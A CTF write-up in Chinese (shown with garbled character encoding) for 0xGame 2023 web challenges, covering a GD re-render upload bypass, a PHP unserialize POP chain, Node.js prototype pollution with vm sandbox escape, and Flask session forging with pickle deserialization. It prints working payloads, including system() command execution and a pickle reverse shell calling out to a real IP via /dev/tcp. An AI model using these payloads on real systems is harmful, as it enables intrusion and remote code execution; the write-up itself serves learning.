&lt;h1&gt;Gravatar&lt;/h1&gt; &lt;p&gt;Upload you personal avatar!&lt;/p&gt; &lt;p&gt;Your upload path: &lt;code&gt;&lt;?='uploads/'.$user_dir.'/'?&gt;&lt;/code&gt;&lt;/p&gt; &lt;?php if (isset($_SESSION['avatar']) &amp;&amp; file_exists($_SESSION['avatar'])) { ?&gt; &lt;p&gt;&lt;img src=\"&lt;?=$_SESSION['avatar']?&gt;\" class=\"rounded\" width=\"200\" height=\"200\"&gt;&lt;/p&gt; &lt;?php } else { ?&gt; &lt;p&gt;You have not uploaded your avatar yet!&lt;/p&gt; &lt;?php } ?&gt; &lt;div class=\"alert alert-info\" id=\"msg\" style=\"display:none\"&gt;&lt;/div&gt; &lt;form onsubmit=\"upload(); return false;\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col\"&gt; &lt;input type=\"file\" name=\"file\" class=\"form-control\" /&gt; &lt;/div&gt; &lt;div class=\"col\"&gt; &lt;input type=\"submit\" value=\"Upload\" class=\"btn btn-primary\"/&gt; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; function upload() { $.ajax({ url: 'upload.php', type: 'POST', cache: false, data: new FormData($('form')[0]), processData: false, contentType: false, success: function (data) { $('#msg').text(data).show(); } }); } &lt;/script&gt; &lt;/html&gt; upload.php &lt;?php error_reporting(0); session_start(); //è¿™é‡Œå­˜å‚¨ç€ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç›®å½•åœ°å€ $user_dir = 'uploads/'.md5($_SERVER['REMOTE_ADDR']).'/'; //å¦‚æœç›®å½•ä¸å­˜åœ¨åˆ™mkdiråˆ›å»ºæ–‡ä»¶ç›®å½• if (!file_exists($user_dir)) { mkdir($user_dir); } //æ£€æŸ¥æ–‡ä»¶ä¸Šä¼ ç±»å‹ï¼Œå¯¹åº”çš„ç”±ç›¸åº”å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°å›¾åƒ switch ($_FILES['file']['type']) { case \"image/gif\": $source = imagecreatefromgif($_FILES['file']['tmp_name']); break; case \"image/jpeg\": $source = imagecreatefromjpeg($_FILES['file']['tmp_name']); break; case \"image/png\": $source = imagecreatefrompng($_FILES['file']['tmp_name']); break; default: die('Invalid file type!'); } //è·å–ä¸Šä¼ æ–‡ä»¶çš„æ‹“å±•åï¼Œæ¥ç€åœ¨æä¸€ä¸ªæ–°æ–‡ä»¶è·¯å¾„ï¼Œç”±åŸæ–‡ä»¶çš„md5å€¼å’Œæ‹“å±•åæ„æˆ $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION); $filepath = $user_dir.md5($_FILES['file']['name']).'.'.$ext; //æ¥ç€åœ¨ä»¥filepathä¸ºæ–‡ä»¶ååˆ›å»ºä¸€ä¸ªæ–°å›¾åƒ--è¿™é‡Œå°±å¯ä»¥æ„Ÿè§‰å‡ºæ˜¯äºŒæ¬¡æ¸²æŸ“äº† switch ($_FILES['file']['type']) { case \"image/gif\": imagegif($source, $filepath); break; case \"image/jpeg\": imagejpeg($source, $filepath); break; case \"image/png\": imagepng($source, $filepath); break; default: die('Invalid file type!'); } echo 'Upload avatar success! Path: '.$filepath; $_SESSION['avatar'] = $filepath; ?&gt; è¿™é‡Œå½“åˆåˆ†æä»£ç çš„æ—¶å€™ä¹Ÿæ²¡å‘ç°ç«Ÿç„¶æ˜¯ä¸€é“äºŒæ¬¡æ¸²æŸ“é¢˜ã€‚ã€‚ã€‚æœç„¶è¿˜æ˜¯å¤ªèœäº†ï¼Œä»£ç å®¡è®¡åŠŸåº•ä¹Ÿåƒåœ¾ è¿™é‡Œå¯¹äºŒæ¬¡æ¸²æŸ“ç”¨çš„ä¸å¤šï¼Œå› æ­¤åªå¾—å•ƒwpäº†ï¼š é¢˜â½¬çš„åŠŸèƒ½å…¶å®æ˜¯ä¸ªç®€å•çš„ \"â¼†æ¬¡æ¸²æŸ“\", â¼†æ¬¡æ¸²æŸ“å°±æ˜¯æŒ‡æœåŠ¡ç«¯å¯¹â½¤æˆ·ä¸Šä¼ çš„å›¾â½šè¿›â¾äº†â¼†æ¬¡å¤„ç†, ä¾‹å¦‚å›¾â½šçš„è£ åˆ‡, æ·»åŠ â½”å°ç­‰ç­‰ å¦‚æœåªæ˜¯åœ¨å›¾â½šçš„æœ«å°¾ç®€å•çš„æ·»åŠ äº† PHP ä»£ç å¹¶ä¸Šä¼ , é‚£ä¹ˆç»è¿‡â¼†æ¬¡æ¸²æŸ“ä¹‹åçš„å›¾â½šæ˜¯ä¸ä¼šåŒ…å«è¿™æ®µä»£ç çš„, å› æ­¤ éœ€è¦å»æ‰¾â¼€äº›ç»•è¿‡ GD åº“â¼†æ¬¡æ¸²æŸ“çš„è„šæœ¬, ç„¶åå†æ„é€ å›¾â½šâ»¢ çœ‹äº†å‡ ç¯‡æ–‡ç« æ„Ÿè§‰äºŒæ¬¡æ¸²æŸ“å°±æ˜¯ä¸€ä¸ªåœ¨ä½ ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ä¹‹åï¼ŒæœåŠ¡å™¨ä¼šå»æå–ä¸€ä¸ªå›¾ç‰‡åŸºæœ¬ç»„æˆè¦ç´ ï¼ˆä¹Ÿå°±æ˜¯ä½ ä¸Šä¼ çš„ï¼‰ä¹‹ååœ¨æ¬¡ç»„åˆæˆä¸€ä¸ªæ–°å›¾åƒå»è‡ªå·±æ–°å»ºä¸€ä¸ªå›¾ç‰‡åå­—å»ä¸Šä¼ ä¿å­˜â€“è¿™é‡Œè§£é‡Šçš„ä¹Ÿæœ‰ç‚¹åƒåœ¾ï¼Œåç»­å†™å®Œwpå°†å…¶ä¸­çš„çŸ¥è¯†ç‚¹å¥½å¥½å­¦å­¦ã€‚ è¿™é‡Œå…ˆå¤ç°ä¸€æ³¢pngå›¾ç‰‡çš„ä¸Šä¼ å§ï¼ŒåŸç†ä¸ç»†è¯´äº†ï¼Œå‚è€ƒæ–‡ç« å¦‚ä¸‹ï¼š https://xz.aliyun.com/t/2657#toc-12 è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä¹Ÿå°±ç›´æ¥å°è¯•å…¶ä¸­ä¸€ä¸ªç®€å•çš„äº†ï¼ˆå› ä¸ºæ‡’â”­â”®ï¹â”­â”® ç›´æ¥ä¸Šå›½å¤–å¤§ç‰›çš„è„šæœ¬ï¼Œä¸€é”®ç”Ÿæˆpng-ä»–è¿™é‡Œæ˜¯å‘pngå†™å…¥idatæ•°æ®å— &lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y &lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,'./1.png'); ?&gt; ä¹‹åæˆ‘ä»¬å¯ä»¥åœ¨phpç¯å¢ƒä¸‹è¿è¡Œä¸Šè¿°ä»£ç ï¼Œæˆ–è€…ç›´æ¥phpstormè¿è¡Œä¹Ÿå¯ï¼Œå°†ç”Ÿæˆçš„pngç›´æ¥ä¸Šä¼ ï¼Œä¸è¿‡è¿™é‡Œä»£ç å¹¶æ²¡æœ‰é™åˆ¶phpåç¼€çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨é¡µé¢ä¸Šä¼ åç›´æ¥bpä¿®æ”¹åç¼€ä¸ºphpå³å¯ ![image-20231023173148935](0xGame 2023/image-20231023173148935.png) å¦‚å›¾å°†pngæ”¹ä¸ºphpä¸Šä¼ ï¼Œä¹‹åè®¿é—®é“¾æ¥æ‰§è¡Œæ¶æ„ä»£ç å³å¯ ![image-20231023173221731](0xGame 2023/image-20231023173221731.png) æ‹¿åˆ°flag [Week 2] ez_unserialize &lt;?php show_source(__FILE__); class Cache { public $key; public $value; public $expired; public $helper; public function __construct($key, $value, $helper) { $this-&gt;key = $key; $this-&gt;value = $value; $this-&gt;helper = $helper; $this-&gt;expired = False; } public function __wakeup() { $this-&gt;expired = False; } public function expired() { if ($this-&gt;expired) { $this-&gt;helper-&gt;clean($this-&gt;key); return True; } else { return False; } } } class Storage { public $store; public function __construct() { $this-&gt;store = array(); } public function __set($name, $value) { if (!$this-&gt;store) { $this-&gt;store = array(); } if (!$value-&gt;expired()) { $this-&gt;store[$name] = $value; } } public function __get($name) { return $this-&gt;data[$name]; } } class Helper { public $funcs; public function __construct($funcs) { $this-&gt;funcs = $funcs; } public function __call($name, $args) { $this-&gt;funcs[$name](...$args); } } class DataObject { public $storage; public $data; public function __destruct() { foreach ($this-&gt;data as $key =&gt; $value) { $this-&gt;storage-&gt;$key = $value; } } } if (isset($_GET['u'])) { unserialize($_GET['u']); } ?&gt; ä¾æ—§æ˜¯æµè§ˆæ•æ„Ÿå‡½æ•°ï¼Œè¿™é‡Œå¯ä»¥å‘ç°$this-&gt;funcs[$name](...$args);å°±æ˜¯æˆ‘ä»¬æœ€ç»ˆè¦åˆ©ç”¨çš„åœ°æ–¹ï¼Œé‚£æˆ‘ä»¬æ€è€ƒå¦‚ä½•è°ƒç”¨callé­”æœ¯æ–¹æ³•ï¼š __call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ ä¾æ®ä¸Šè¿°æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°$this-&gt;helper-&gt;clean($this-&gt;key);æ•æ„Ÿè¯­å¥ï¼Œå€˜è‹¥æˆ‘ä»¬å°†helperèµ‹å€¼ä¸ºHelperå¯¹è±¡ï¼Œè€Œå…¶ä¸­ä¹Ÿæ²¡æœ‰cleanæ–¹æ³•ï¼Œé‚£æˆ‘ä»¬ä¾¿æˆåŠŸè°ƒç”¨ï¼Œæ¥ä¸‹æ¥åœ¨åˆ¤æ–­å¦‚ä½•è°ƒç”¨å…¶æ‰€åœ¨çš„expiredæ–¹æ³•ï¼Œæˆ‘ä»¬æ¥ç€æµè§ˆå¯ä»¥çœ‹åˆ° if (!$value-&gt;expired()) { $this-&gt;store[$name] = $value; } è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬å°†valueå˜é‡èµ‹å€¼ä¸ºCacheå¯¹è±¡ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥æˆåŠŸè°ƒç”¨ï¼Œé‚£æ¥ä¸‹æ¥åœ¨åˆ¤æ–­å¦‚ä½•è°ƒç”¨å…¶æ‰€åœ¨çš„seté­”æœ¯æ–¹æ³•ï¼š __set()ï¼Œåœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶è°ƒç”¨ ä¾æ®ä¸Šè¿°æˆ‘ä»¬å¯ä»¥æ‰¾åˆ° foreach ($this-&gt;data as $key =&gt; $value) { $this-&gt;storage-&gt;$key = $value; } è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬å°†storageèµ‹å€¼ä¸ºStorageå¯¹è±¡æ—¶ï¼Œæ¥ç€å°†keyå˜é‡èµ‹å€¼ä¸ºå¯¹è±¡ä¸­æ²¡æœ‰çš„å±æ€§ï¼Œé‚£æˆ‘ä»¬ä¾¿å¯ä»¥æˆåŠŸè°ƒç”¨ã€‚ç»¼ä¸Šæ‰€è¿°æˆ‘ä»¬popé“¾å¦‚ä¸‹ï¼š DataObject.__destruct() -&gt; Storage.__set() -&gt; Cache.expired() -&gt; Helper.__call() æ¥ä¸‹æ¥å°±æ˜¯å˜é‡èµ‹å€¼é—®é¢˜äº†ï¼Œè¿™é‡Œæˆ‘ä¹Ÿæ˜¯æœ‰ç‚¹æ‰‹è¶³æ— æªï¼Œåªå¥½å€ŸåŠ©wpäº†ã€‚ã€‚ã€‚payloadå¦‚ä¸‹ï¼š &lt;?php class Cache { public $key; public $value; public $expired; public $helper; } class Storage { public $store; } class Helper { public $funcs; } class DataObject { public $storage; public $data; } $cache1 = new Cache(); $cache2 = new Cache(); $poc = new DataObject(); $poc-&gt;storage = new Storage(); $poc-&gt;storage-&gt;store = &amp;$cache2-&gt;expired; $cache2-&gt;key = 'php -r \"phpinfo();\"'; $poc-&gt;data = array('key1' =&gt; $cache1, 'key2' =&gt; $cache2); $cache2-&gt;helper = new Helper(); $cache2-&gt;helper-&gt;funcs = array('clean' =&gt; 'system'); echo serialize($poc); ?&gt; è¿™é‡Œåœ¨æ€»ç»“ä¸€æ³¢æ€è·¯ï¼Œé¦–å…ˆnewä¸¤ä¸ªCacheå¯¹è±¡ï¼Œæ¥ç€newä¸€ä¸ªDataObjectå¯¹è±¡ï¼Œç”¨äºåç»­è°ƒç”¨Storage.__set()æ–¹æ³•ï¼Œæ¥ç€ç»™å…¶ä¸­çš„storageèµ‹å€¼ä¸ºStorageå¯¹è±¡ï¼Œéšååœ¨å°†storageä¸­çš„storeå±æ€§ä¸cache2çš„expiredå±æ€§åšä¸€ä¸ªå¼•ç”¨ã€‚ç„¶åæ˜¯å°†dataå±æ€§èµ‹å€¼ä¸ºå«æœ‰ä¸¤ä¸ªå…ƒç´ çš„æ•°ç»„ï¼š è¿™é‡Œå‘¢å…ˆçœ‹dataçš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¹Ÿå°±æ˜¯cache1ï¼Œå…¶åœ¨foreachå¾ªç¯çš„ç¬¬ä¸€æ¬¡èµ‹å€¼æ—¶ï¼Œè°ƒç”¨äº†seté­”æœ¯æ–¹æ³•ï¼Œè¿™æ—¶å€™å…¶ä¸­çš„storeå±æ€§è¢«èµ‹å€¼ä¸ºç©ºæ•°ç»„ï¼Œæ¥ç€ç”±äºcache1çš„expiredå±æ€§ä¸ºfalseï¼Œè¿™æ—¶å€™æ˜¯æ— æ³•æˆåŠŸè°ƒç”¨cleanæ–¹æ³•çš„ï¼Œäºæ˜¯storeæ•°ç»„æ­¤æ—¶è¢«èµ‹å€¼ä¸ºarray('key1'=&gt;$cache1)ï¼Œæ€»ä¹‹æ­¤æ—¶storeä¾¿ä¸åœ¨æ˜¯ç©ºäº†ã€‚ä½†æ­¤æ—¶æˆ‘ä»¬æ³¨æ„ç”±äºå¼•ç”¨çš„å­˜åœ¨ï¼Œæ­¤æ—¶cache2çš„expiredå±æ€§å·²ç»ä¸å¯èƒ½ä¸ºfalseäº†ï¼Œç´§æ¥ç€åœ¨ç¬¬äºŒæ¬¡foreachå¾ªç¯æ—¶ï¼Œä¾¿å¯ä»¥æˆåŠŸè°ƒç”¨cache2çš„cleanæ–¹æ³• æ¥ç€æˆ‘ä»¬å°†helperèµ‹å€¼ä¸ºHelperå¯¹è±¡ï¼Œç”±äºå…¶ä¸­ä¸å­˜åœ¨cleanæ–¹æ³•ï¼Œäºæ˜¯æˆ‘ä»¬æˆåŠŸè°ƒç”¨äº†å…¶ä¸­çš„callé­”æœ¯æ–¹æ³•ï¼Œå¹¶ä¸”å­—ç¬¦ä¸²cleanä¸keyè¢«å½“åšcallçš„å‚æ•°ï¼Œæ­¤æ—¶æˆ‘ä»¬åˆå¯ä»¥å°†å…¶ä¸­çš„funcsèµ‹å€¼ä¸ºä¸€ä¸ªæ•°ç»„ï¼šarray('clean'=&gt;'system')ã€‚å…¶ä¸­çš„keyä¸ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„æ¶æ„ä»£ç å³å¯ï¼Œè¿™æ ·åœ¨ä¸Šè¿°çš„ç»„åˆä¸‹$this-&gt;funcs[$name](...$args);å˜ä¸º$this-&gt;funcs['clean'](æ¶æ„ä»£ç );=&gt;system(æ¶æ„ä»£ç ); O:10:\"DataObject\":2:{s:7:\"storage\";O:7:\"Storage\":1:{s:5:\"store\";N;}s:4:\"data\";a:2:{s:4:\"key1\";O:5:\"Cache\":4:{s:3:\"key\";N;s:5:\"value\";N;s:7:\"expired\";N;s:6:\"helper\";N;}s:4:\"key2\";O:5:\"Cache\":4:{s:3:\"key\";s:19:\"php -r \"phpinfo();\"\";s:5:\"value\";N;s:7:\"expired\";R:3;s:6:\"helper\";O:6:\"Helper\":1:{s:5:\"funcs\";a:1:{s:5:\"clean\";s:6:\"system\";}}}}} è¾“å‡ºå¦‚ä¸Šï¼Œè¿™é‡Œä¹Ÿæ˜¯çœ‹åˆ«äººwpçŸ¥é“flagè¢«æ”¾åœ¨äº†ç¯å¢ƒå˜é‡ä¸­ï¼Œè¿™é‡Œå®ƒé‡‡ç”¨è¯»å–phpinfoçš„æ–¹æ³•ã€‚ä½†ä»¤æˆ‘ç–‘æƒ‘çš„æ˜¯ä¸ºä½•ç›´æ¥èµ‹å€¼ä¸ºphpinfo()çš„è¯æ‰§è¡Œä¸äº†ã€‚ã€‚ã€‚ ![image-20231023191959782](0xGame 2023/image-20231023191959782.png) æ‹¿åˆ°flag [Week 2] ez_sandbox æ‰“å¼€é¢˜ç›®å‘ç°ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¼±å£ä»¤æ— æœï¼Œæ‰”ç»™dirsearchæ‰«ç›®å½•ï¼Œéšåç”¨bpæŠ“ä¸€ä¸ªç™»å½•åŒ…æ•°æ®çœ‹çœ‹æœ‰ä½•ä¿¡æ¯ï¼š ![image-20231026195758333](0xGame 2023/image-20231026195758333.png) å¦‚ä¸Šå›¾æ˜¯ä¸€ä¸ªjsonæ•°æ®å—ï¼Œå…¶ä¸­åŒ…å«ç”¨æˆ·åå’Œå¯†ç ï¼Œå…¶æ¬¡æ‰«ç›®å½•å‘ç°å­˜åœ¨æ³¨å†Œç”¨æˆ·é¡µé¢ï¼Œçœ‹é¢˜ç›®åç§°ä¸ºæ²™ç®±ï¼Œä¹Ÿæ²¡æ€è·¯ï¼Œäºæ˜¯çœ‹wpå‘ç°è€ƒå¯Ÿnodejsæ²™ç®±é€ƒé€¸å’ŒåŸå‹é“¾æ±¡æŸ“ï¼ˆæ‡µé€¼äº†ï¼Œè¿™ç©æ„å„¿æ²¡å’‹å¥½å¥½å­¦ï¼Œâ”­â”®ï¹â”­â”®ï¼‰åªèƒ½æµ‘æ°´æ‘¸é±¼äº†ï¼Œå†™å®Œwpåå°±å­¦ï¼ï¼ï¼ ä»£ç åœ¨æ³¨å†Œå’Œç™»å½•çš„æ—¶å€™ä½¿â½¤äº† clone(req.body) function merge(target, source) { for (let key in source) { if (key === '__proto__') { continue } if (key in source &amp;&amp; key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } } return target } function clone(source) { return merge({}, source) } æ ¹æ®â¼€äº›å‚è€ƒâ½‚ç« , å¾ˆå®¹æ˜“å°±å¯ä»¥çŸ¥é“è¿™â¾¥å­˜åœ¨åŸå‹é“¾æ±¡æŸ“, ä½†æ˜¯ proto å…³é”®è¯è¢«è¿‡æ»¤äº† å¦‚æœä½ å¯¹åŸå‹é“¾è¿™ä¸ªæ¦‚å¿µç¨å¾®åšâ¼€ç‚¹æ·±â¼Šäº†è§£, å°±å¯ä»¥çŸ¥é“, å¯¹äºâ¼€ä¸ªå®ä¾‹å¯¹è±¡, å®ƒçš„ proto å°±ç­‰äºconstructor.prototypeè¿™æ ·å¯ä»¥ç»•è¿‡protoå…³é”®è¯çš„è¿‡æ»¤ å…ˆæ³¨å†Œâ¼€ä¸ª testç”¨æˆ·, åœ¨ç™»å½•æ—¶ POST å¦‚ä¸‹å†…å®¹, æ±¡æŸ“ admins å¯¹è±¡, ä½¿å¾— username in admins è¡¨è¾¾å¼çš„ç»“æœä¸ºTrue { \"username\": \"test\", \"password\": \"test\", \"constructor\": { \"prototype\": { \"test\": \"123\" } } } ![image-20231026201904531](0xGame 2023/image-20231026201904531.png) éšåtest 123ç™»å½•è¿›å»å‘ç°æˆåŠŸå¾—åˆ°adminç”¨æˆ·æƒé™ ![image-20231026201951999](0xGame 2023/image-20231026201951999.png) ç„¶åæ˜¯â¼€ä¸ªç®€å•çš„ vm æ²™ç®±é€ƒé€¸ https://xz.aliyun.com/t/11859 ä»£ç ä¼š catch vm æ²™ç®±æ‰§â¾æ—¶æŠ›å‡ºçš„å¼‚å¸¸, å¹¶è®¿é—®å¼‚å¸¸çš„ message å±æ€§ é‚£ä¹ˆç»“åˆä¸Šé¢çš„æ–‡ç« , å¯ä»¥é€šè¿‡ throw æŠ›å‡ºå¯¹è±¡çš„æ€è·¯, æ‹¿åˆ° arguments.callee.caller (æŒ‡å‘ å½“å‰å‡½æ•°çš„è°ƒç”¨è€…), ç„¶åæ‹¿åˆ°æ²™ç®±å¤–çš„ process å¯¹è±¡, æœ€ç»ˆå®ç° RCE waf å‡½æ•°æœ‰â¼€äº›ç®€å•çš„å…³é”®è¯è¿‡æ»¤, ä¸è¿‡å› ä¸º Javascript è¯­è¨€æœ¬èº«éå¸¸çµæ´», æ‰€ä»¥å¯ä»¥ä½¿ç”¨ä¸­ æ‹¬å· + å­—ç¬¦ä¸²æ‹¼æ¥çš„å½¢å¼ç»•è¿‡ https://www.anquanke.com/post/id/237032 ä¸‹é¢ä¸¤ç§æ–¹å¼éƒ½è¡Œ // method 1 throw new Proxy({}, { // Proxy å¯¹è±¡â½¤äºåˆ›å»ºå¯¹æŸâ¼€å¯¹è±¡çš„ä»£ç†, ä»¥å®ç°å±æ€§å’Œâ½…æ³•çš„æ‹¦æˆª get: function(){ // è®¿é—®è¿™ä¸ªå¯¹è±¡çš„ä»»æ„â¼€ä¸ªå±æ€§éƒ½ä¼šæ‰§â¾ get æŒ‡å‘çš„å‡½æ•° const c = arguments.callee.caller const p = (c['constru'+'ctor']['constru'+'ctor']('return pro'+'cess'))() return p['mainM'+'odule']['requi'+'re']('child_pr'+'ocess')['ex'+'ecSync']('cat /flag').toString(); } }) // method 2 let obj = {} // é’ˆå¯¹è¯¥å¯¹è±¡çš„ message å±æ€§å®šä¹‰â¼€ä¸ª getter, å½“è®¿é—® obj.message æ—¶ä¼šè°ƒâ½¤å¯¹åº”çš„å‡½æ•° obj.__defineGetter__('message', function(){ const c = arguments.callee.caller const p = (c['constru'+'ctor']['constru'+'ctor']('return pro'+'cess'))() return p['mainM'+'odule']['requi'+'re']('child_pr'+'ocess')['ex'+'ecSync']('cat /flag').toString(); }) throw obj ![image-20231026202002001](0xGame 2023/image-20231026202002001.png) æ‹¿åˆ°flagï¼ˆç­‰æˆ‘æ·±å…¥å­¦ä¹ ä¸€æ³¢å†å›æ¥æ€è€ƒ [Week 3] notebook ![image-20231026203700101](0xGame 2023/image-20231026203700101.png) æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªç¬”è®°æœ¬ ï¼Ÿï¼Ÿï¼Ÿ,è¿™é‡Œæµ‹è¯•äº†ä¸€ç•ªå‘ç°ä¸æ˜¯xssç­‰æ¼æ´ï¼Œæœç›®å½•ä¹Ÿæ²¡æœ‰ä¿¡æ¯ï¼Œæ ¹æ®é¢˜ç›®æç¤ºè¯´æ˜¯è¯¥é¡¹ç›®ç”±flaskæ¡†æ¶æ­å»ºã€‚ä¹‹åçœ‹äº†wpå‘ç°è€ƒå¯Ÿçš„æ˜¯sessionä¼ªæ„é€ ï¼Œpickleååºåˆ—åŒ–ï¼Œåå¼¹shell é¢˜ç›®æºç å¦‚ä¸‹ï¼š from flask import Flask, request, render_template, session import pickle import uuid import os app = Flask(__name__) app.config['SECRET_KEY'] = os.urandom(2).hex() class Note(object): def __init__(self, name, content): self._name = name self._content = content @property def name(self): return self._name @property def content(self): return self._content @app.route('/') def index(): return render_template('index.html') @app.route('/&lt;path:note_id&gt;', methods=['GET']) def view_note(note_id): notes = session.get('notes') if not notes: return render_template('note.html', msg='You have no notes') note_raw = notes.get(note_id) if not note_raw: return render_template('note.html', msg='This note does not exist') note = pickle.loads(note_raw) return render_template('note.html', note_id=note_id, note_name=note.name, note_content=note.content) @app.route('/add_note', methods=['POST']) def add_note(): note_name = request.form.get('note_name') note_content = request.form.get('note_content') if note_name == '' or note_content == '': return render_template('index.html', status='add_failed', msg='note name or content is empty') note_id = str(uuid.uuid4()) note = Note(note_name, note_content) if not session.get('notes'): session['notes'] = {} notes = session['notes'] notes[note_id] = pickle.dumps(note) session['notes'] = notes return render_template('index.html', status='add_success', note_id=note_id) @app.route('/delete_note', methods=['POST']) def delete_note(): note_id = request.form.get('note_id') if not note_id: return render_template('index.html') notes = session.get('notes') if not notes: return render_template('index.html', status='delete_failed', msg='You have no notes') if not notes.get(note_id): return render_template('index.html', status='delete_failed', msg='This note does not exist') del notes[note_id] session['notes'] = notes return render_template('index.html', status='delete_success') if __name__ == '__main__': app.run(host='0.0.0.0', port=8000, debug=False) è¿™é‡Œç”±äºæ²¡å­¦è¿‡ç›¸å…³çŸ¥è¯†ï¼Œæˆ‘è¿˜æ˜¯è·Ÿç€wpèµ°ä¸€éå§ï¼Œåç»­å†å»è¡¥ è¿™é‡Œåˆ†æä¸€éä»£ç ä¼šå‘ç°ï¼Œå­˜åœ¨secret keyï¼Œè¿™é‡Œå°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨å…¶å»sessionä¼ªé€  â¾¸å…ˆå¾—çŸ¥é“ flask çš„ session ä¿¡æ¯å­˜å‚¨åœ¨ cookie ä¸­, å› æ­¤è¿™ç§ session ä¹Ÿè¢«ç§°ä½œ \"å®¢æˆ·ç«¯ session\" â½½ session è¦æƒ³ä¿è¯ä¸è¢«æ¶æ„ä¿®æ”¹, å°±ä¼šä½¿â½¤â¼€ä¸ª secret key è¿›â¾ç­¾å æ³¨æ„ \"ç­¾å\" ä¸ç­‰äº \"åŠ å¯†\", æˆ‘ä»¬å…¶å®ä»ç„¶èƒ½å¤Ÿçœ‹åˆ° session ä¸­å­˜å‚¨çš„ä¿¡æ¯, ä½†æ˜¯â½†æ³•ä¿®æ”¹å®ƒ, è¿™â¼€ç‚¹å’Œ JWT (JSON Web Token) ç±»ä¼¼ é¢˜ç›®ä¸­çš„ secret keyï¼Œè¿™â¾¥ç•™äº†ä¸ªéšæœºæ•°ä¸»è¦æ˜¯è®©â¼¤å®¶å…³æ³¨éšæœºæ•°çš„é•¿åº¦, å¦‚æœè¿™ä¸ªé•¿åº¦è¿‡å°, é‚£ä¹ˆå¾ˆå®¹æ˜“å°±èƒ½çˆ†ç ´å‡ºæ¥ï¼Œâ¼€éƒ¨åˆ†äººå¯èƒ½ä¸çŸ¥é“å®ƒé•¿åº¦æ˜¯å¤šå°‘, è¿™ä¸ªå…¶å®æ”¾åˆ° python é‡Œé¢è¿è¡Œâ¼€ä¸‹å°±çŸ¥é“äº†, åªæœ‰ 4 ä½ï¼Œç„¶åå› ä¸ºæ˜¯ hex, æ‰€ä»¥åªä¼šå‡ºç° 0123456789abcdef è¿™äº›å­—ç¬¦ ![image-20231104101618909](0xGame 2023/image-20231104101618909.png) å¦‚å›¾æ‰€ç¤ºï¼Œå¯ä»¥çœ‹åˆ°ä½æ•°æ˜¯4ä½ï¼Œæ¥ä¸‹æ¥å…ˆæ‰‹åŠ¨ç”Ÿæˆâ¼€ä¸ªå››ä½æ•°å­—å…¸ import itertools d = itertools.product('0123456789abcdef', repeat=4) with open('dicts.txt', 'w') as f: for i in d: s = ''.join(i) f.write(s + ' ') åˆ©ç”¨sessionä¼ªé€ å·¥å…·ï¼šhttps://github.com/Paradoxis/Flask-Unsign å°†ä¸Šè¿°è„šæœ¬ç”Ÿæˆçš„txtå¤åˆ¶åˆ°å·¥å…·çš„ç›®å½•ä¸‹ï¼Œéšåè¾“å…¥å¦‚ä¸‹å‘½ä»¤ flask-unsign --unsign --cookie \".eJwti1sLgjAYQP9K7H0w5qZ8gg82MqULmJeZb9vwks0KCnwQ_3sJHThv58zo8fw0b-TPyGPMczlhmCkDmDXKYFDgYAKUM8dVwFy1dhuNfNSFWZmm4R9xEhG0WkYvbaG1ybTLRyB1neVWjFsb0-KQTFFFea-lLIaw7A299IZn6zdoykktOfl9-2t1vq_auLwduyBAy7J8ARAdMR4.ZUW4BQ.76TUC_1vDgzmCy2DVpM6xWsZQyc\" --wordlist dicts.txt --no-literal-eval è¿™é‡Œçš„cookieçš„è·å–æ˜¯å¦‚ä¸‹å›¾æ‰€ç¤ºçš„é¡µé¢ä¸‹çš„cookie ![image-20231104112534159](0xGame 2023/image-20231104112534159.png) ![image-20231104105505385](0xGame 2023/image-20231104105505385.png) å¦‚å›¾æˆåŠŸçˆ†ç ´ï¼Œç„¶åå°±æ˜¯åˆ©ç”¨è·¯ç”±/&lt;path:note_id&gt;ä¸‹çš„pickleååºåˆ—åŒ–ï¼Œè¿™é‡Œç”¨çš„æ˜¯åå¼¹shellï¼Œpayloadå¦‚ä¸‹ï¼ˆï¼‰ b'''cos system (S\"bash -c 'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1'\" tR. ''' ç„¶åå°±æ˜¯sessionä¼ªé€ ï¼Œæ³¨æ„note_idå€¼è¦ä¸ºå¯¹åº”å€¼ flask-unsign --sign --cookie \"{'notes': {'74476504-4ac9-4eac-9a93-0925436a946a': b'''cos system (S'bash -c \\'bash -i &gt;&amp; /dev/tcp/124.220.233.26/5555 0&gt;&amp;1\\'' tR.'''}}\" --secret 143b 